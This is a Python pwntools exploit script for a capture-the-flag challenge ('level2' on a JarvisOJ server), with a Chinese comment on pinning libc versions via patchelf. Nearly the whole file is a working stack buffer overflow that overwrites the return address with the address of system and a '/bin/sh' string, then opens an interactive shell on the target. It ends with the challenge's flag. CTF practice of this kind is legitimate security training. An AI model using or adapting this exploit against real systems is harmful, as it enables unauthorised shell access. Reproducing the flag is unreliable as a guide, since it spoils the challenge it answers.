#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@author: starvii
如果依赖特定版本的libc，请使用patchelf对可执行文件修改
例如，使用x64的2.23版本的libc，

patchelf --set-interpreter /glibc/2.23/64/lib/ld-linux-x86-64.so.2 <binary>
patchelf --replace-needed libc.so.6 /glibc/2.23/64/lib/libc.so.6 <binary>

"""

import sys
from typing import Optional
from pwn import *
from pwnlib import gdb

context(arch="i386", os="linux", log_level="debug")

class Config:
    def __init__(self,
            elf: str,
            host: Optional[str]=None,
            port: Optional[int]=None):
        self.elf: str = elf
        if host is not None and port is not None and 0 < port < 65536:
            self.host: str = host
            self.port: int = port


cfg = Config("./level2", "pwn2.jarvisoj.com", 9878)
elf = ELF(cfg.elf)

if len(sys.argv) > 1:
    io = remote(cfg.host, cfg.port)
else:
    io = process(cfg.elf)
 

def main():
    io.recvuntil(":\n")
    system_addr = elf.sym["system"]
    bin_sh_addr = next(elf.search(b"/bin/sh"))
    log.success("system_addr = 0x%x", system_addr)
    log.success("bin_sh_addr = 0x%x", bin_sh_addr)
    payload = flat((
        "A" * (0x88 + 4),
        p32(system_addr),
        p32(0xdeadbeef),
        p32(bin_sh_addr),
    ))
    io.send(payload)
    io.interactive()

if __name__ == "__main__":
    main()

# CTF{1759d0cbd854c54ffa886cd9df3a3d52}
